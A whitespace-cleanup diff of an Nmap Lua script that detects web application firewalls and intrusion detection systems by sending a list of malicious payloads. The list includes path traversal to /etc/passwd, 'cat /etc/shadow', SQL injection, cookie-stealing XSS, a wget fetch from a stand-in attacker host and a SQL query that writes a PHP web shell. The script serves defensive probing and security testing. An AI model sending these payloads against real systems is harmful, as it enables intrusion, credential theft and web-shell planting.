@@ -7,9 +7,9 @@ local table = require "table"
 description = [[
 Attempts to determine whether a web server is protected by an IPS (Intrusion Prevention System), IDS (Intrusion Detection System) or WAF (Web Application Firewall) by probing the web server with malicious payloads and detecting changes in the response code and body.
 
-To do this the script will send a "good" request and record the response, afterwards it will match this response against new requests containing 
-malicious payloads. In theory, web applications shouldn't react to malicious requests because we are storing the payloads in a variable that is 
-not used by the script/file and only WAF/IDS/IPS should react to it. 
+To do this the script will send a "good" request and record the response, afterwards it will match this response against new requests containing
+malicious payloads. In theory, web applications shouldn't react to malicious requests because we are storing the payloads in a variable that is
+not used by the script/file and only WAF/IDS/IPS should react to it.
 If aggro mode is set, the script will try all attack vectors (More noisy)
 
 This script can detect numerous IDS, IPS, and WAF products since
@@ -19,9 +19,9 @@ Results can vary based on product configuration, but this script
 has been tested to work against various configurations of the
 following products:
 
- * Apache ModSecurity 
- * Barracuda Web Application Firewall 
- * PHPIDS 
+ * Apache ModSecurity
+ * Barracuda Web Application Firewall
+ * PHPIDS
  * dotDefender
  * Imperva Web Firewall
  * Blue Coat SG 400
@@ -53,14 +53,14 @@ categories = {"discovery", "intrusive"}
 
 portrule = shortport.http
 
-local attack_vectors_n1 = {"?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd", 
+local attack_vectors_n1 = {"?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd",
                             "?p4yl04d2=1%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables",
                             "?p4yl04d3=<script>alert(document.cookie)</script>"}
 
-local attack_vectors_n2 = {"?p4yl04d=cat%20/etc/shadow", "?p4yl04d=id;uname%20-a", "?p4yl04d=<?php%20phpinfo();%20?>", 
-                          "?p4yl04d='%20OR%20'A'='A", "?p4yl04d=http://google.com", "?p4yl04d=http://evilsite.com/evilfile.php", 
-                          "?p4yl04d=cat%20/etc/passwd", "?p4yl04d=ping%20google.com", "?p4yl04d=hostname%00", 
-                          "?p4yl04d=<img%20src='x'%20onerror=alert(document.cookie)%20/>", "?p4yl04d=wget%20http://ev1l.com/xpl01t.txt", 
+local attack_vectors_n2 = {"?p4yl04d=cat%20/etc/shadow", "?p4yl04d=id;uname%20-a", "?p4yl04d=<?php%20phpinfo();%20?>",
+                          "?p4yl04d='%20OR%20'A'='A", "?p4yl04d=http://google.com", "?p4yl04d=http://evilsite.com/evilfile.php",
+                          "?p4yl04d=cat%20/etc/passwd", "?p4yl04d=ping%20google.com", "?p4yl04d=hostname%00",
+                          "?p4yl04d=<img%20src='x'%20onerror=alert(document.cookie)%20/>", "?p4yl04d=wget%20http://ev1l.com/xpl01t.txt",
                           "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php'--"}
 
 action = function(host, port)
@@ -70,7 +70,7 @@ action = function(host, port)
   local use_body = stdnse.get_script_args(SCRIPT_NAME..".detectBodyChanges") or false
 
   --get original response from a "good" request
-  stdnse.print_debug(2, "%s: Requesting URI %s", SCRIPT_NAME, path) 
+  stdnse.print_debug(2, "%s: Requesting URI %s", SCRIPT_NAME, path)
   orig_req = http.get(host, port, path)
   orig_req.body = http.clean_404(orig_req.body)
   if orig_req.status and orig_req.body then
@@ -95,7 +95,7 @@ action = function(host, port)
 
   if test_results == nil then
     return "[ERROR] HTTP request table is empty. This should not ever happen because we at least made one request."
-  end 
+  end
 
 
   --get results
@@ -114,10 +114,10 @@ action = function(host, port)
       if res.status and res.body then
         stdnse.print_debug(3, "Status:%s Body:%s\n", res.status, res.body)
       end
-      waf_bool = true   
+      waf_bool = true
     end
   end
-  
+
   if waf_bool then
     return string.format("IDS/IPS/WAF detected:\n%s:%d%s%s", stdnse.get_hostname(host), port.number, path, payload_example)
   end
